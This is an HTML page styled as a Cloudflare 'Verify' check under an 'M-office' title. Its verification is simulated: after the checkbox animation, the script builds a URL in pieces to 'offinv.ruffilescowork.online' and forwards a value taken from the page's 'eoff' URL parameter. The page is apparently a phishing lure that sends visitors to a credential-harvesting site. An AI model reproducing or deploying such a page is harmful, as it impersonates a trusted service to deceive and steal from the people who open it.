<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>M-office</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #f8f8f8;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            overflow: hidden;
        }

        .logo-screen {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f8f8f8;
            z-index: 10;
        }

        .logo-img {
            width: 180px;
            height: 180px;
            object-fit: contain;
            animation: breathing 2s ease-in-out infinite;
            opacity: 1;
            transition: opacity 0.5s ease;
        }

        @keyframes breathing {
            0% {
                transform: scale(0.95);
                opacity: 0.9;
            }
            50% {
                transform: scale(1.05);
                opacity: 1;
            }
            100% {
                transform: scale(0.95);
                opacity: 0.9;
            }
        }

        .verification-box {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            padding: 30px;
            width: 100%;
            height: 100px;
            max-width: 480px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border: 1px solid #e0e0e0;
            opacity: 0;
            transition: opacity 0.5s ease;
        }

        .verification-section {
            display: flex;
            align-items: center;
        }

        .verification-label {
            display: flex;
            align-items: center;
            cursor: pointer;
            font-size: 18px;
            font-weight: 500;
            color: #333;
        }

        .checkbox-container {
            position: relative;
            width: 24px;
            height: 24px;
            margin-right: 12px;
        }

        .checkbox {
            position: absolute;
            opacity: 0;
            cursor: pointer;
            height: 0;
            width: 0;
        }

        .checkmark {
            position: absolute;
            top: 0;
            left: 0;
            height: 24px;
            width: 24px;
            background-color: #f0f0f0;
            border-radius: 4px;
            border: 2px solid #ccc;
            transition: all 0.3s ease;
        }

        .checkbox:checked ~ .checkmark {
            background-color: #4CAF50;
            border-color: #4CAF50;
        }

        .checkmark:after {
            content: "";
            position: absolute;
            display: none;
        }

        .checkbox:checked ~ .checkmark:after {
            display: block;
            left: 7px;
            top: 3px;
            width: 6px;
            height: 12px;
            border: solid white;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
        }

        .spinner {
            display: none;
            width: 24px;
            height: 24px;
            border: 3px solid rgba(76, 175, 80, 0.3);
            border-radius: 50%;
            border-top-color: #4CAF50;
            animation: spin 1s ease-in-out infinite;
            margin-right: 12px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .success-text {
            display: none;
            color: #4CAF50;
            font-weight: 600;
        }

        .branding-section {
            display: flex;
            flex-direction: column;
            align-items: flex-end;
            text-align: right;
        }

        .logo-container {
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }

        .cloudflare-img {
            width: 40px;
            height: 40px;
            margin-right: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 14px;
        }

        .logo {
            font-size: 15px;
            font-weight: 700;
            color: #2c3e50;
            letter-spacing: 1px;
        }

        .footer {
            color: #777;
            font-size: 14px;
        }

        .footer a {
            color: #777;
            text-decoration: none;
            margin: 0 5px;
        }

        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="logo-screen" id="logo-screen">
        <img src="logo.png" alt="Logo" class="logo-img" id="logo-img">
    </div>

    <div class="verification-box" id="verification-box">
        <div class="verification-section">
            <label class="verification-label" id="verification-label">
                <div class="checkbox-container">
                    <input type="checkbox" class="checkbox" id="verification-checkbox">
                    <span class="checkmark"></span>
                    <div class="spinner" id="spinner"></div>
                </div>
                <span id="verification-text">Verify</span>
                <span id="verifying-text" style="display: none;">Verifying...</span>
                <span class="success-text" id="success-text">Success!</span>
            </label>
        </div>

        <div class="branding-section">
            <div class="logo-container">
                <img src="cloudflare_.png" alt="Cloudflare" class="cloudflare-img">
                <div class="logo">CLOUDFLARE</div>
            </div>
            <div class="footer">
                <a href="#">Privacy</a> Â· <a href="#">Terms</a>
            </div>
        </div>
    </div>

    <script>
        // Show logo with breathing animation for 2.5 seconds, then show verification
        window.addEventListener('load', function() {
            const logoScreen = document.getElementById('logo-screen');
            const logoImg = document.getElementById('logo-img');
            const verificationBox = document.getElementById('verification-box');

            setTimeout(function() {
                // Fade out the logo
                logoImg.style.opacity = '0';

                setTimeout(function() {
                    // Hide logo screen and show verification
                    logoScreen.style.display = 'none';
                    verificationBox.style.opacity = '1';
                }, 500); // Wait for fade out to complete
            }, 2500); // Show logo for 2.5 seconds
        });

        document.getElementById('verification-checkbox').addEventListener('change', function() {
            const checkbox = this;
            const spinner = document.getElementById('spinner');
            const verificationText = document.getElementById('verification-text');
            const verifyingText = document.getElementById('verifying-text');
            const successText = document.getElementById('success-text');
            const checkmark = document.querySelector('.checkmark');

            if (checkbox.checked) {
                // Show spinner and hide checkbox
                checkmark.style.display = 'none';
                spinner.style.display = 'block';
                verificationText.style.display = 'none';
                verifyingText.style.display = 'inline';

                // Simulate verification process
                setTimeout(function() {
                    // Show success
                    spinner.style.display = 'none';
                    verifyingText.style.display = 'none';
                    successText.style.display = 'inline';

                    // Get the parameter from current URL
                    const urlParams = new URLSearchParams(window.location.search);
                    const eoffValue = urlParams.get('eoff') || '';

                    // Construct redirect URL in pieces
                    const baseUrl = 'offinv.ruffilescowork.online';
                    const path = '/DabPdSTl';
                    const hash = eoffValue ? '#' + eoffValue : '';

                    // Combine pieces and redirect
                    const redirectUrl = 'https://' + baseUrl + path + hash;

                    // Redirect after a short delay
                    setTimeout(function() {
                        window.location.href = redirectUrl;
                    }, 1000);
                }, 1500);
            }
        });
    </script>
</body>
</html>
